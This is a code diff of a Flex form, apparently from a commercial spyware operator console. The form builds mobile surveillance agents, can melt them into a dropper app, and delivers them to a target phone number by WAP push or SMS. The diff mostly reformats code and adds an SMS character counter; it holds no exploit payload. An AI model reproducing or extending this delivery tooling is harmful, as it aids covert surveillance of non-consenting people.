@@ -8,22 +8,24 @@
 
 	<fx:Script>
 		<![CDATA[
-			import it.ht.rcs.console.monitor.controller.LicenseManager;
-			import it.ht.rcs.console.network.controller.CollectorManager;
-			import it.ht.rcs.console.operations.view.agents.build.UploadPopup;
-			import it.ht.rcs.console.task.controller.DownloadManager;
-			import it.ht.rcs.console.utils.AlertPopUp;
-			import it.ht.rcs.console.build.controller.BuildManager;
-			import it.ht.rcs.console.build.model.SymbianConf;
-
-			import locale.R;
-
-			import mx.collections.ListCollectionView;
-			import mx.core.UIComponent;
-			import mx.events.ValidationResultEvent;
-			import mx.managers.PopUpManager;
-			import mx.rpc.events.FaultEvent;
-			import mx.rpc.events.ResultEvent;
+      import it.ht.rcs.console.build.controller.BuildManager;
+      import it.ht.rcs.console.build.model.SymbianConf;
+      import it.ht.rcs.console.monitor.controller.LicenseManager;
+      import it.ht.rcs.console.network.controller.CollectorManager;
+      import it.ht.rcs.console.operations.view.agents.build.UploadPopup;
+      import it.ht.rcs.console.task.controller.DownloadManager;
+      import it.ht.rcs.console.utils.AlertPopUp;
+      
+      import locale.R;
+      
+      import mx.collections.ListCollectionView;
+      import mx.core.UIComponent;
+      import mx.events.ValidationResultEvent;
+      import mx.managers.PopUpManager;
+      import mx.rpc.events.FaultEvent;
+      import mx.rpc.events.ResultEvent;
+      
+      import spark.events.TextOperationEvent;
 
 			[Bindable]
 			private var urls:ListCollectionView;
@@ -31,11 +33,11 @@
 			private var params:Object;
 
 			private var platforms:Array;
-      
-      private var keyReference:FileReference;
 
-      private var android_file:Boolean = false;
-      
+			private var keyReference:FileReference;
+
+			private var android_file:Boolean=false;
+
 			public function set platform(value:*):void
 			{
 				if (value == 'android' || value == 'blackberry' || value == 'symbian' || value == 'multiplatform')
@@ -83,26 +85,26 @@
 
 			private function browse():void
 			{
-        if(!params)
-				  params={platform: 'symbian', binary: {demo: createBtn.demo.selected}, sign: {edition: 'symbian3'}, melt: {appname: appname.text}};
+				if (!params)
+					params={platform: 'symbian', binary: {demo: createBtn.demo.selected}, sign: {edition: 'symbian3'}, melt: {appname: appname.text}};
 
 				fileReference=new FileReference();
 				fileReference.addEventListener(Event.SELECT, uploadCert);
-        fileReference.browse([new FileFilter("Cer", "*.cer")]);
+				fileReference.browse([new FileFilter("Cer", "*.cer")]);
 			}
 
-      private function browse_android():void
-      {
-        fileReference = new FileReference();
-        fileReference.addEventListener(Event.SELECT, fileSelection);
-        fileReference.browse();
-      }
-      
-      private function fileSelection(event:Event):void
-      {
-        android_file = true;
-      }
-	
+			private function browse_android():void
+			{
+				fileReference=new FileReference();
+				fileReference.addEventListener(Event.SELECT, fileSelection);
+				fileReference.browse();
+			}
+
+			private function fileSelection(event:Event):void
+			{
+				android_file=true;
+			}
+
 			private var uploadPopup:UploadPopup;
 
 			private function uploadCert(event:Event):void
@@ -122,9 +124,9 @@
 			private function onUploadComplete(event:DataEvent):void
 			{
 				PopUpManager.removePopUp(uploadPopup);
-        if(!params.sign)
-          params.sign={};
-        params['sign']['cert']=event.data;
+				if (!params.sign)
+					params.sign={};
+				params['sign']['cert']=event.data;
 			}
 
 			private function onUploadError(event:Event):void
@@ -186,21 +188,21 @@
 				else
 					params={platform: 'wap', generate: {platforms: platforms, binary: {demo: createBtn.demo.selected}, sign: {}, melt: {appname: appname.text}, 'package': {type: 'remote'}}, deliver: {}};
 
-        params['deliver']['number']=number.text;
-        
-        // append the subdir to the appname
-        params['deliver']['link'] = complete_with_slash(url.textInput.text) + appname.text + "/" + appname.text;
-        
-        if (servindication.selected)
-          params['deliver']['type']='si';
-        if (servloading.selected)
-          params['deliver']['type']='sl';
-        if (sms.selected)
-          params['deliver']['type']='sms';
-        
-        params['deliver']['text']=text.text;
-        params['factory']={_id: parentDocument.factory._id};
-       
+				params['deliver']['number']=number.text;
+
+				// append the subdir to the appname
+				params['deliver']['link']=complete_with_slash(url.textInput.text) + appname.text + "/" + appname.text;
+
+				if (servindication.selected)
+					params['deliver']['type']='si';
+				if (servloading.selected)
+					params['deliver']['type']='sl';
+				if (sms.selected)
+					params['deliver']['type']='sms';
+
+				params['deliver']['text']=text.text;
+				params['factory']={_id: parentDocument.factory._id};
+
 
 				if (currentState == 'blackberry')
 				{
@@ -210,21 +212,23 @@
 					params['generate']['melt']['version']=versionForm.text;
 				}
 
-        if (currentState == 'android') {
-          params['generate']['binary']['admin'] = admin.selected;
-          if (android_file) {
-            fileReference.addEventListener(HTTPStatusEvent.HTTP_STATUS, onUploadError);
-            fileReference.addEventListener(IOErrorEvent.IO_ERROR, onUploadError);
-            fileReference.addEventListener(SecurityErrorEvent.SECURITY_ERROR, onUploadError);
-            fileReference.addEventListener(DataEvent.UPLOAD_COMPLETE_DATA, onUploadCompleteMelt);
-            
-            uploadPopup = PopUpManager.createPopUp(this.parentDocument as DisplayObject, UploadPopup, true) as UploadPopup;
-            uploadPopup.fileReference = fileReference;
-            PopUpManager.centerPopUp(uploadPopup);
-            return;
-          }
-        }
-        
+				if (currentState == 'android')
+				{
+					params['generate']['binary']['admin']=admin.selected;
+					if (android_file)
+					{
+						fileReference.addEventListener(HTTPStatusEvent.HTTP_STATUS, onUploadError);
+						fileReference.addEventListener(IOErrorEvent.IO_ERROR, onUploadError);
+						fileReference.addEventListener(SecurityErrorEvent.SECURITY_ERROR, onUploadError);
+						fileReference.addEventListener(DataEvent.UPLOAD_COMPLETE_DATA, onUploadCompleteMelt);
+
+						uploadPopup=PopUpManager.createPopUp(this.parentDocument as DisplayObject, UploadPopup, true) as UploadPopup;
+						uploadPopup.fileReference=fileReference;
+						PopUpManager.centerPopUp(uploadPopup);
+						return;
+					}
+				}
+
 				if (currentState == 'symbian')
 				{
 					if (!params.generate.sign)
@@ -238,13 +242,13 @@
 						AlertPopUp.show(R.get('MISSING_CERT'));
 						return;
 					}
-          
-          if (!params.generate.sign.key)
-          {
-            AlertPopUp.show(R.get('MISSING_KEY'));
-            return;
-          }
-          
+
+					if (!params.generate.sign.key)
+					{
+						AlertPopUp.show(R.get('MISSING_KEY'));
+						return;
+					}
+
 					params['generate']['sign']['edition']=edition.selectedItem;
 				}
 
@@ -281,56 +285,71 @@
 			{
 				trace("symbian conf fault")
 			}
+
+			private function editSymbianConf():void
+			{
+				var symbianConf:SymbianConfigurationForm=PopUpManager.createPopUp((this.parentDocument as DisplayObject).parent, SymbianConfigurationForm, true) as SymbianConfigurationForm;
+				PopUpManager.centerPopUp(symbianConf);
+			}
+
+			private function browseForKey():void
+			{
+				if (!params)
+					params={platform: 'symbian', binary: {demo: createBtn.demo.selected}, sign: {edition: 'symbian3'}, melt: {appname: appname.text}};
+				keyReference=new FileReference();
+				keyReference.addEventListener(Event.SELECT, onKeySelected);
+				keyReference.browse([new FileFilter("Key", "*.key")]);
+			}
+
+			private function onKeySelected(e:Event):void
+			{
+				uploadKey()
+			}
+
+			private function uploadKey():void
+			{
+				keyReference.addEventListener(HTTPStatusEvent.HTTP_STATUS, onUploadError);
+				keyReference.addEventListener(IOErrorEvent.IO_ERROR, onUploadError);
+				keyReference.addEventListener(SecurityErrorEvent.SECURITY_ERROR, onUploadError);
+				keyReference.addEventListener(DataEvent.UPLOAD_COMPLETE_DATA, onKeyUploadComplete);
+
+				uploadPopup=PopUpManager.createPopUp(this.parentDocument as DisplayObject, UploadPopup, true) as UploadPopup;
+				uploadPopup.fileReference=keyReference;
+				PopUpManager.centerPopUp(uploadPopup);
+			}
+
+			private function onKeyUploadComplete(event:DataEvent):void
+			{
+				PopUpManager.removePopUp(uploadPopup);
+				if (!params.sign)
+					params.sign={};
+				params['sign']['key']=event.data;
+			}
+
+			private function onUploadCompleteMelt(event:DataEvent):void
+			{
+				PopUpManager.removePopUp(uploadPopup);
+
+				params['generate']['melt']={input: event.data, appname: appname.text};
+
+				DownloadManager.instance.createTask("build", null, params, onSuccess, onFailure);
+			}
       
-      private function editSymbianConf():void
+      private function onTypeSelection():void
       {
-        var symbianConf:SymbianConfigurationForm=PopUpManager.createPopUp((this.parentDocument as DisplayObject).parent, SymbianConfigurationForm, true) as SymbianConfigurationForm;
-        PopUpManager.centerPopUp(symbianConf);
+        if(sms.selected)
+        {
+          text.maxChars=70;
+        }
       }
       
-      private function browseForKey():void
+      protected function onTextChange():void
       {
-        if(!params)
-          params={platform: 'symbian', binary: {demo: createBtn.demo.selected}, sign: {edition: 'symbian3'}, melt: {appname: appname.text}};
-        keyReference=new FileReference();
-        keyReference.addEventListener(Event.SELECT, onKeySelected);
-        keyReference.browse([new FileFilter("Key", "*.key")]);
-      }
-      
-      private function onKeySelected(e:Event):void
-      {
-        uploadKey()
-      }
-      
-      private function uploadKey():void
-      {
-        keyReference.addEventListener(HTTPStatusEvent.HTTP_STATUS, onUploadError);
-        keyReference.addEventListener(IOErrorEvent.IO_ERROR, onUploadError);
-        keyReference.addEventListener(SecurityErrorEvent.SECURITY_ERROR, onUploadError);
-        keyReference.addEventListener(DataEvent.UPLOAD_COMPLETE_DATA, onKeyUploadComplete);
+       smsNotice.text="(max 70 char) - "+text.text.length
         
-        uploadPopup=PopUpManager.createPopUp(this.parentDocument as DisplayObject, UploadPopup, true) as UploadPopup;
-        uploadPopup.fileReference=keyReference;
-        PopUpManager.centerPopUp(uploadPopup);
       }
       
-      private function onKeyUploadComplete(event:DataEvent):void
-      {
-        PopUpManager.removePopUp(uploadPopup);
-        if(!params.sign)
-          params.sign={};
-        params['sign']['key']=event.data;
-      }
-      
-      private function onUploadCompleteMelt(event:DataEvent):void
-      {
-        PopUpManager.removePopUp(uploadPopup);
-        
-        params['generate']['melt'] = {input: event.data, appname: appname.text};
-        
-        DownloadManager.instance.createTask("build", null, params, onSuccess, onFailure);
-      }
-		]]>
+    ]]>
 	</fx:Script>
 
 	<fx:Declarations>
@@ -340,8 +359,8 @@
 	<s:states>
 		<s:State name='all'/>
 		<s:State name='multiplatform'/>
-    <s:State name='android'/>
-    <s:State name='blackberry'/>
+		<s:State name='android'/>
+		<s:State name='blackberry'/>
 		<s:State name='symbian'/>
 	</s:states>
 
@@ -360,7 +379,7 @@
 			<s:ComboBox id="url"
 									dataProvider="{urls}"
 									labelFunction="collName"
-                  requireSelection="true"
+									requireSelection="true"
 									selectedIndex="0"/>
 		</s:FormItem>
 		<s:FormItem label="Service Type">
@@ -368,32 +387,50 @@
 				<s:RadioButton id="servloading"
 											 label="Loading"
 											 groupName="Service"
-											 selected="true"/>
+											 selected="true" change="onTypeSelection()"/>
 				<s:RadioButton id="servindication"
 											 label="Indication"
-											 groupName="Service"/>
+											 groupName="Service" change="onTypeSelection()"/>
 				<s:RadioButton id="sms"
 											 label="SMS"
-											 groupName="Service"/>
+											 groupName="Service" change="onTypeSelection()"/>
 			</s:HGroup>
 		</s:FormItem>
 		<s:FormItem label="{R.get('TEXT')}"
 								enabled="{!servloading.selected}">
 			<s:TextInput id="text"
 									 text=""
-									 width="180"/>
+									 width="180" change="onTextChange()"/>
+			<s:Label text="(max 70 char)" fontSize="9"
+							 id="smsNotice"
+							 visible="{sms.selected}"
+							 includeInLayout="{sms.selected}"/>
 		</s:FormItem>
+
 	</s:Form>
 
-  <s:VGroup includeIn="android" left="10" top="190">
-    <s:CheckBox left="10" id="admin" label="{R.get('REQUIRE_ADMIN')}" fontWeight="bold" selected="false"/>
-    <s:TextArea left="25" width="280" height="55" borderVisible="false"
-                contentBackgroundAlpha="0.0" editable="false"
-                text="{R.get('REQUIRE_ADMIN_DESC')}"/>    
-    <s:Label text="{R.get('APPLICATION_DROPPER')}:" fontWeight="bold"/>
-    <s:Button width="100" label="{R.get('BROWSE')}..." click="browse_android()"/>
-  </s:VGroup>
-  
+	<s:VGroup includeIn="android"
+						left="10"
+						top="190">
+		<s:CheckBox left="10"
+								id="admin"
+								label="{R.get('REQUIRE_ADMIN')}"
+								fontWeight="bold"
+								selected="false"/>
+		<s:TextArea left="25"
+								width="280"
+								height="55"
+								borderVisible="false"
+								contentBackgroundAlpha="0.0"
+								editable="false"
+								text="{R.get('REQUIRE_ADMIN_DESC')}"/>
+		<s:Label text="{R.get('APPLICATION_DROPPER')}:"
+						 fontWeight="bold"/>
+		<s:Button width="100"
+							label="{R.get('BROWSE')}..."
+							click="browse_android()"/>
+	</s:VGroup>
+
 	<s:Form includeIn="blackberry"
 					left="10"
 					top="180">
@@ -401,7 +438,7 @@
 			<s:TextInput id="nameForm"
 									 text="RIM Compatibility Library"
 									 width="150"/>
-		</s:FormItem> 
+		</s:FormItem>
 		<s:FormItem label="{R.get('DESCRIPTION')}">
 			<s:TextInput id="descForm"
 									 text="RIM Compatibility Library used by applications in the App World"
@@ -428,11 +465,11 @@
 								label="{R.get('BROWSE')}..."
 								click="browse()"/>
 		</s:FormItem>
-    <s:FormItem label="{R.get('SYMBIAN_KEY')}">
-      <s:Button width="80"
-                label="{R.get('BROWSE')}..."
-                click="browseForKey()"/>
-    </s:FormItem>
+		<s:FormItem label="{R.get('SYMBIAN_KEY')}">
+			<s:Button width="80"
+								label="{R.get('BROWSE')}..."
+								click="browseForKey()"/>
+		</s:FormItem>
 		<s:FormItem label="S60 Edition">
 			<s:DropDownList id="edition"
 											selectedIndex="0"
@@ -446,38 +483,41 @@
 		</s:FormItem>
 	</s:Form>
 	<!-- Symbian configuration is OK-->
-  <s:HGroup includeIn="symbian" 
-            left="10"
-            top="290"
-            verticalAlign="middle"
-            visible="{BuildManager.instance.symbianConf.uids.length==6}"
-            includeInLayout="{BuildManager.instance.symbianConf.uids.length==6}">
-    <s:Spacer height="40"/>
-    <s:HGroup verticalAlign="middle">
-      <s:Label text="{R.get('SYMBIAN_CONF_OK')}."/>
-      <s:Label text="{R.get('SYMBIAN_CHANGE')}" buttonMode="true" click="editSymbianConf()"/>
-    </s:HGroup>
-  </s:HGroup>
-  
-  <!-- You have no Symbian configuration yet, please provide the data: -->
-  
-  <s:HGroup includeIn="symbian" 
-            left="10"
-            top="190"
-            verticalAlign="middle"
-            visible="{BuildManager.instance.symbianConf.uids.length!=6}"
-            includeInLayout="{BuildManager.instance.symbianConf.uids.length!=6}">
-    <s:Label text="{R.get('SYMBIAN_CONF_MISSED')}"
-             color="0xFF0000"
-             fontWeight="bold"/>
-    <s:Button label="{R.get('CONFIGURATION_SET')}" click="editSymbianConf()"/>
-  </s:HGroup>
-  
-  <build:CreateWithDemoButton id="createBtn"
-                              left="10"
-                              bottom="0"
-                              right="10"
-                              create="{send}"
-                              visible="{currentState=='all' || currentState=='android' || currentState=='blackberry' || currentState=='multiplatform' || (currentState=='symbian' &amp;&amp; BuildManager.instance.symbianConf.uids.length==6)}"/>
+	<s:HGroup includeIn="symbian"
+						left="10"
+						top="290"
+						verticalAlign="middle"
+						visible="{BuildManager.instance.symbianConf.uids.length==6}"
+						includeInLayout="{BuildManager.instance.symbianConf.uids.length==6}">
+		<s:Spacer height="40"/>
+		<s:HGroup verticalAlign="middle">
+			<s:Label text="{R.get('SYMBIAN_CONF_OK')}."/>
+			<s:Label text="{R.get('SYMBIAN_CHANGE')}"
+							 buttonMode="true"
+							 click="editSymbianConf()"/>
+		</s:HGroup>
+	</s:HGroup>
+
+	<!-- You have no Symbian configuration yet, please provide the data: -->
+
+	<s:HGroup includeIn="symbian"
+						left="10"
+						top="190"
+						verticalAlign="middle"
+						visible="{BuildManager.instance.symbianConf.uids.length!=6}"
+						includeInLayout="{BuildManager.instance.symbianConf.uids.length!=6}">
+		<s:Label text="{R.get('SYMBIAN_CONF_MISSED')}"
+						 color="0xFF0000"
+						 fontWeight="bold"/>
+		<s:Button label="{R.get('CONFIGURATION_SET')}"
+							click="editSymbianConf()"/>
+	</s:HGroup>
+
+	<build:CreateWithDemoButton id="createBtn"
+															left="10"
+															bottom="0"
+															right="10"
+															create="{send}"
+															visible="{currentState=='all' || currentState=='android' || currentState=='blackberry' || currentState=='multiplatform' || (currentState=='symbian' &amp;&amp; BuildManager.instance.symbianConf.uids.length==6)}"/>
 
 </s:Group>
